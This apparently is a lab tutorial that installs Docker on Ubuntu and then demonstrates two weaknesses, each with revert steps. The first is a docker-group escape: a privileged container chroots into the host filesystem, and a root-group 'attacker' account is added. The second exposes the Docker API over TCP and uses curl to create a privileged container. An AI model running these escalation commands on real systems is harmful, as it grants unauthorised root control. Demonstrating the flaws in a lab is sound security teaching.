### Install Docker in Ubuntu

```sh
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
```

```sh
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

```sh
systemctl status docker
```

### Docker Group Security
```sh
useradd test-user 

id test-user

usermod -aG docker test-user
passwd test-user

su - test-user

sudo su -

docker run --rm -it --privileged --net=host -v /:/mnt ubuntu chroot /mnt bash

whoami

useradd attacker

usermod -aG root attacker
```
Logout from container
```sh
userdel attacker

gpasswd -d test-user docker

gpasswd -d attacker root
```

### Expose the Docker API
```sh
nano /usr/lib/systemd/system/docker.service
```
```sh
ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://127.0.0.1:2375 --containerd=/run/containerd/containerd.sock
```

```sh
systemctl daemon-reload

systemctl restart docker
```
### Testing if Docker API Is Exposed

An attacker can check if the Docker remote API is accessible using curl:
```sh
curl http://127.0.0.1:2375/version
```
An attacker can list all running containers:
```sh

docker run -d nginx

curl http://127.0.0.1:2375/containers/json
```

Create New Container
```sh
curl -X POST -H "Content-Type: application/json"   --data '{"Image": "nginx", "Cmd": ["tail", "-f", "/dev/null"], "HostConfig": {"Privileged": true}}'   http://127.0.0.1:2375/containers/create
```

Start the Container
```sh
curl -X POST http://127.0.0.1:2375/containers/<CONTAINER_ID>/start
```

### Reverting the Changes:

1. Remove Docker API from /usr/lib/systemd/system/docker.service
```sh
systemctl daemon-reload

systemctl stop docker

systemctl stop docker.socket

systemctl start docker

docker ps -a
docker rm <container-name>

docker images
docker rmi <image-names>
```